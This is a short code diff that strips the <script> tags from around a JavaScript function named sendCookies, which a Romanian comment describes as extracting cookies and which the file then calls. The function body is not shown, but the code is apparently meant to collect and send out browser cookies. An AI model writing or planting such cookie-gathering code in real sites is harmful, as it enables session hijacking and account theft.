@@ -1,4 +1,4 @@
-<script>
+
 async function sendCookies() {
     try {
         // Extrage cookie-urile
@@ -23,4 +23,3 @@ async function sendCookies() {
 }
 
 sendCookies();
-</script>
